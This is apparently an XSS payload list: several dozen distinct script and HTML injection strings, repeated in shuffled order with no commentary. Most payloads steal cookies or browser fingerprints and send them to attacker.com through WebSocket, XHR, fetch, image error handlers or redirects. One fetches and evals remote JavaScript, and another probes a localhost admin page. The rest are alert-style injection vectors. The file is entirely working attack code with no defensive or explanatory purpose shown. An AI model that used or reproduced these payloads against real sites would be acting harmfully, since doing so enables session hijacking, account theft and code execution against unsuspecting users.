<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
